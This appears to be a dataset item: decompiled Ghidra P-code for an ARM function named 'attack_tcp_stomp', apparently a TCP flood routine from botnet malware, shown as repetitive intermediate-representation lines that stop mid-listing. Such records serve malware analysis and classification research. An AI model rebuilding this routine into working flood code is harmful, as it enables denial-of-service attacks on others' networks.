Label: 321348292
Function: attack_tcp_stomp
Architecture: arm
Source File: Unknown
Entry Point: 00017e84

High-level P-code:

(register, 0x2c, 4) INT_ZEXT (register, 0x20, 1)
(unique, 0x100003d1, 4) CALL (ram, 0x26a60, 8) , (register, 0x2c, 4) , (const, 0x10, 4)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0x3d, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x53c, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x53c, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x53c, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x53c, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x53c, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x53c, 4)
(stack, 0xffffffffffffffcf, 1) INDIRECT (stack, 0xffffffffffffffcf, 1) , (const, 0x53c, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x53c, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0x53c, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0x53c, 4)
(stack, 0xffffffffffffffd8, 1) INDIRECT (stack, 0xffffffffffffffd8, 1) , (const, 0x53c, 4)
(stack, 0xffffffffffffffd9, 1) INDIRECT (stack, 0xffffffffffffffd9, 1) , (const, 0x53c, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x53c, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x53c, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x53c, 4)
(stack, 0xffffffffffffffde, 1) INDIRECT (stack, 0xffffffffffffffde, 1) , (const, 0x53c, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x53c, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x53c, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x53c, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x53c, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x53c, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x53c, 4)
(stack, 0xfffffffffffffe8c, 2) INDIRECT (stack, 0xfffffffffffffe8c, 2) , (const, 0x53c, 4)
(stack, 0xfffffffffffffe99, 1) INDIRECT (stack, 0xfffffffffffffe99, 1) , (const, 0x53c, 4)
(register, 0x65, 1) INT_NOTEQUAL (register, 0x20, 4) , (const, 0xffffffff, 4)
 ---  CBRANCH (ram, 0x186ec, 1) , (register, 0x65, 1)
(register, 0x20, 4) CALL (ram, 0x299d4, 8) , (register, 0x20, 4) , (const, 0x3, 4) , (const, 0x0, 4)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0x56d, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0x56d, 4)
(stack, 0xffffffffffffff78, 4) INDIRECT (stack, 0xffffffffffffff78, 4) , (const, 0x56d, 4)
(stack, 0xffffffffffffff80, 4) INDIRECT (stack, 0xffffffffffffff80, 4) , (const, 0x56d, 4)
(stack, 0xffffffffffffff8c, 2) INDIRECT (stack, 0xffffffffffffff8c, 2) , (const, 0x56d, 4)
(stack, 0xffffffffffffff8e, 2) INDIRECT (stack, 0xffffffffffffff8e, 2) , (const, 0x56d, 4)
(stack, 0xffffffffffffff90, 4) INDIRECT (stack, 0xffffffffffffff90, 4) , (const, 0x56d, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x56d, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x56d, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x56d, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x56d, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x56d, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x56d, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (register, 0x20, 4) , (const, 0x56d, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x56d, 4)
(stack, 0xffffffffffffffcf, 1) INDIRECT (stack, 0xffffffffffffffcf, 1) , (const, 0x56d, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x56d, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0x56d, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0x56d, 4)
(stack, 0xffffffffffffffd8, 1) INDIRECT (stack, 0xffffffffffffffd8, 1) , (const, 0x56d, 4)
(stack, 0xffffffffffffffd9, 1) INDIRECT (stack, 0xffffffffffffffd9, 1) , (const, 0x56d, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x56d, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x56d, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x56d, 4)
(stack, 0xffffffffffffffde, 1) INDIRECT (stack, 0xffffffffffffffde, 1) , (const, 0x56d, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x56d, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x56d, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x56d, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x56d, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x56d, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x56d, 4)
(stack, 0xfffffffffffffe8c, 2) INDIRECT (stack, 0xfffffffffffffe8c, 2) , (const, 0x56d, 4)
(stack, 0xfffffffffffffe99, 1) INDIRECT (stack, 0xfffffffffffffe99, 1) , (const, 0x56d, 4)
(register, 0x2c, 4) INT_OR (register, 0x20, 4) , (const, 0x800, 4)
 ---  CALL (ram, 0x299d4, 8) , (stack, 0xffffffffffffffb4, 4) , (const, 0x4, 4) , (register, 0x2c, 4)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0x58b, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0x58b, 4)
(stack, 0xffffffffffffff78, 4) INDIRECT (stack, 0xffffffffffffff78, 4) , (const, 0x58b, 4)
(stack, 0xffffffffffffff80, 4) INDIRECT (stack, 0xffffffffffffff80, 4) , (const, 0x58b, 4)
(stack, 0xffffffffffffff8c, 2) INDIRECT (stack, 0xffffffffffffff8c, 2) , (const, 0x58b, 4)
(stack, 0xffffffffffffff8e, 2) INDIRECT (stack, 0xffffffffffffff8e, 2) , (const, 0x58b, 4)
(stack, 0xffffffffffffff90, 4) INDIRECT (stack, 0xffffffffffffff90, 4) , (const, 0x58b, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x58b, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x58b, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x58b, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x58b, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x58b, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x58b, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x58b, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x58b, 4)
(stack, 0xffffffffffffffcf, 1) INDIRECT (stack, 0xffffffffffffffcf, 1) , (const, 0x58b, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x58b, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0x58b, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0x58b, 4)
(stack, 0xffffffffffffffd8, 1) INDIRECT (stack, 0xffffffffffffffd8, 1) , (const, 0x58b, 4)
(stack, 0xffffffffffffffd9, 1) INDIRECT (stack, 0xffffffffffffffd9, 1) , (const, 0x58b, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x58b, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x58b, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x58b, 4)
(stack, 0xffffffffffffffde, 1) INDIRECT (stack, 0xffffffffffffffde, 1) , (const, 0x58b, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x58b, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x58b, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x58b, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x58b, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x58b, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x58b, 4)
(stack, 0xfffffffffffffe8c, 2) INDIRECT (stack, 0xfffffffffffffe8c, 2) , (const, 0x58b, 4)
(stack, 0xfffffffffffffe99, 1) INDIRECT (stack, 0xfffffffffffffe99, 1) , (const, 0x58b, 4)
(stack, 0xffffffffffffff8c, 2) COPY (const, 0x2, 2)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x100001e8, 4) PTRADD (register, 0x24, 4) , (stack, 0xffffffffffffff9c, 4) , (const, 0x18, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x100001e8, 4) , (const, 0x14, 4)
(unique, 0x1f00, 1) INT_LESS (unique, 0x43980, 1) , (const, 0x20, 1)
 ---  CBRANCH (ram, 0x181ac, 1) , (unique, 0x1f00, 1)
(register, 0x2c, 4) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x100001f4, 4) PTRADD (register, 0x24, 4) , (stack, 0xffffffffffffff9c, 4) , (const, 0x18, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x100001f4, 4) , (const, 0x10, 4)
(register, 0x20, 4) CALL (ram, 0x2bbe0, 8) , (register, 0x2c, 4)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0x603, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0x603, 4)
(stack, 0xffffffffffffff78, 4) INDIRECT (stack, 0xffffffffffffff78, 4) , (const, 0x603, 4)
(stack, 0xffffffffffffff80, 4) INDIRECT (stack, 0xffffffffffffff80, 4) , (const, 0x603, 4)
(stack, 0xffffffffffffff8c, 2) INDIRECT (stack, 0xffffffffffffff8c, 2) , (const, 0x603, 4)
(stack, 0xffffffffffffff8e, 2) INDIRECT (stack, 0xffffffffffffff8e, 2) , (const, 0x603, 4)
(stack, 0xffffffffffffff90, 4) INDIRECT (stack, 0xffffffffffffff90, 4) , (const, 0x603, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x603, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x603, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x603, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x603, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x603, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x603, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x603, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x603, 4)
(stack, 0xffffffffffffffcf, 1) INDIRECT (stack, 0xffffffffffffffcf, 1) , (const, 0x603, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x603, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0x603, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0x603, 4)
(stack, 0xffffffffffffffd8, 1) INDIRECT (stack, 0xffffffffffffffd8, 1) , (const, 0x603, 4)
(stack, 0xffffffffffffffd9, 1) INDIRECT (stack, 0xffffffffffffffd9, 1) , (const, 0x603, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x603, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x603, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x603, 4)
(stack, 0xffffffffffffffde, 1) INDIRECT (stack, 0xffffffffffffffde, 1) , (const, 0x603, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x603, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x603, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x603, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x603, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x603, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x603, 4)
(stack, 0xfffffffffffffe8c, 2) INDIRECT (stack, 0xfffffffffffffe8c, 2) , (const, 0x603, 4)
(stack, 0xfffffffffffffe99, 1) INDIRECT (stack, 0xfffffffffffffe99, 1) , (const, 0x603, 4)
(register, 0x20, 4) CALL (ram, 0x1cb48, 8)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0x606, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0x606, 4)
(stack, 0xffffffffffffff78, 4) INDIRECT (stack, 0xffffffffffffff78, 4) , (const, 0x606, 4)
(stack, 0xffffffffffffff80, 4) INDIRECT (stack, 0xffffffffffffff80, 4) , (const, 0x606, 4)
(stack, 0xffffffffffffff8c, 2) INDIRECT (stack, 0xffffffffffffff8c, 2) , (const, 0x606, 4)
(stack, 0xffffffffffffff8e, 2) INDIRECT (stack, 0xffffffffffffff8e, 2) , (const, 0x606, 4)
(stack, 0xffffffffffffff90, 4) INDIRECT (stack, 0xffffffffffffff90, 4) , (const, 0x606, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x606, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x606, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x606, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x606, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x606, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x606, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x606, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x606, 4)
(stack, 0xffffffffffffffcf, 1) INDIRECT (stack, 0xffffffffffffffcf, 1) , (const, 0x606, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x606, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0x606, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0x606, 4)
(stack, 0xffffffffffffffd8, 1) INDIRECT (stack, 0xffffffffffffffd8, 1) , (const, 0x606, 4)
(stack, 0xffffffffffffffd9, 1) INDIRECT (stack, 0xffffffffffffffd9, 1) , (const, 0x606, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x606, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x606, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x606, 4)
(stack, 0xffffffffffffffde, 1) INDIRECT (stack, 0xffffffffffffffde, 1) , (const, 0x606, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x606, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x606, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x606, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x606, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x606, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x606, 4)
(stack, 0xfffffffffffffe8c, 2) INDIRECT (stack, 0xfffffffffffffe8c, 2) , (const, 0x606, 4)
(stack, 0xfffffffffffffe99, 1) INDIRECT (stack, 0xfffffffffffffe99, 1) , (const, 0x606, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x10000200, 4) PTRADD (register, 0x24, 4) , (stack, 0xffffffffffffff9c, 4) , (const, 0x18, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x10000200, 4) , (const, 0x14, 4)
(unique, 0x5780, 4) INT_RIGHT (register, 0x20, 4) , (unique, 0x43980, 1)
(register, 0x2c, 4) INT_ADD (register, 0x20, 4) , (unique, 0x5780, 4)
(register, 0x20, 4) CALL (ram, 0x2bbe0, 8) , (register, 0x2c, 4)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0x64a, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0x64a, 4)
(stack, 0xffffffffffffff78, 4) INDIRECT (stack, 0xffffffffffffff78, 4) , (const, 0x64a, 4)
(stack, 0xffffffffffffff80, 4) INDIRECT (stack, 0xffffffffffffff80, 4) , (const, 0x64a, 4)
(stack, 0xffffffffffffff8c, 2) INDIRECT (stack, 0xffffffffffffff8c, 2) , (const, 0x64a, 4)
(stack, 0xffffffffffffff8e, 2) INDIRECT (stack, 0xffffffffffffff8e, 2) , (const, 0x64a, 4)
(stack, 0xffffffffffffff90, 4) INDIRECT (stack, 0xffffffffffffff90, 4) , (const, 0x64a, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x64a, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x64a, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x64a, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x64a, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x64a, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x64a, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x64a, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x64a, 4)
(stack, 0xffffffffffffffcf, 1) INDIRECT (stack, 0xffffffffffffffcf, 1) , (const, 0x64a, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x64a, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0x64a, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0x64a, 4)
(stack, 0xffffffffffffffd8, 1) INDIRECT (stack, 0xffffffffffffffd8, 1) , (const, 0x64a, 4)
(stack, 0xffffffffffffffd9, 1) INDIRECT (stack, 0xffffffffffffffd9, 1) , (const, 0x64a, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x64a, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x64a, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x64a, 4)
(stack, 0xffffffffffffffde, 1) INDIRECT (stack, 0xffffffffffffffde, 1) , (const, 0x64a, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x64a, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x64a, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x64a, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x64a, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x64a, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x64a, 4)
(stack, 0xfffffffffffffe8c, 2) INDIRECT (stack, 0xfffffffffffffe8c, 2) , (const, 0x64a, 4)
(stack, 0xfffffffffffffe99, 1) INDIRECT (stack, 0xfffffffffffffe99, 1) , (const, 0x64a, 4)
 ---  BRANCH (ram, 0x181d8, 1)
(register, 0x2c, 4) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x1000020c, 4) PTRADD (register, 0x24, 4) , (stack, 0xffffffffffffff9c, 4) , (const, 0x18, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x1000020c, 4) , (const, 0x10, 4)
(register, 0x2c, 4) INT_ZEXT (stack, 0xffffffffffffffdc, 2)
(ram, 0x18930, 4) MULTIEQUAL (ram, 0x18930, 4) , (ram, 0x18930, 4)
(ram, 0x18934, 4) MULTIEQUAL (ram, 0x18934, 4) , (ram, 0x18934, 4)
(stack, 0xffffffffffffff78, 4) MULTIEQUAL (stack, 0xffffffffffffff78, 4) , (stack, 0xffffffffffffff78, 4)
(stack, 0xffffffffffffff80, 4) MULTIEQUAL (stack, 0xffffffffffffff80, 4) , (stack, 0xffffffffffffff80, 4)
(stack, 0xffffffffffffff8c, 2) MULTIEQUAL (stack, 0xffffffffffffff8c, 2) , (stack, 0xffffffffffffff8c, 2)
(stack, 0xffffffffffffff8e, 2) MULTIEQUAL (stack, 0xffffffffffffff8e, 2) , (stack, 0xffffffffffffff8e, 2)
(stack, 0xffffffffffffff90, 4) MULTIEQUAL (register, 0x20, 4) , (register, 0x2c, 4)
(stack, 0xffffffffffffff9c, 4) MULTIEQUAL (stack, 0xffffffffffffff9c, 4) , (stack, 0xffffffffffffff9c, 4)
(stack, 0xffffffffffffffa0, 4) MULTIEQUAL (stack, 0xffffffffffffffa0, 4) , (stack, 0xffffffffffffffa0, 4)
(stack, 0xffffffffffffffa4, 4) MULTIEQUAL (stack, 0xffffffffffffffa4, 4) , (stack, 0xffffffffffffffa4, 4)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffac, 4) MULTIEQUAL (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffac, 4)
(stack, 0xffffffffffffffb0, 4) MULTIEQUAL (stack, 0xffffffffffffffb0, 4) , (stack, 0xffffffffffffffb0, 4)
(stack, 0xffffffffffffffb4, 4) MULTIEQUAL (stack, 0xffffffffffffffb4, 4) , (stack, 0xffffffffffffffb4, 4)
(stack, 0xffffffffffffffc8, 4) MULTIEQUAL (stack, 0xffffffffffffffc8, 4) , (stack, 0xffffffffffffffc8, 4)
(stack, 0xffffffffffffffcf, 1) MULTIEQUAL (stack, 0xffffffffffffffcf, 1) , (stack, 0xffffffffffffffcf, 1)
(stack, 0xffffffffffffffd0, 4) MULTIEQUAL (stack, 0xffffffffffffffd0, 4) , (stack, 0xffffffffffffffd0, 4)
(stack, 0xffffffffffffffd6, 1) MULTIEQUAL (stack, 0xffffffffffffffd6, 1) , (stack, 0xffffffffffffffd6, 1)
(stack, 0xffffffffffffffd7, 1) MULTIEQUAL (stack, 0xffffffffffffffd7, 1) , (stack, 0xffffffffffffffd7, 1)
(stack, 0xffffffffffffffd8, 1) MULTIEQUAL (stack, 0xffffffffffffffd8, 1) , (stack, 0xffffffffffffffd8, 1)
(stack, 0xffffffffffffffd9, 1) MULTIEQUAL (stack, 0xffffffffffffffd9, 1) , (stack, 0xffffffffffffffd9, 1)
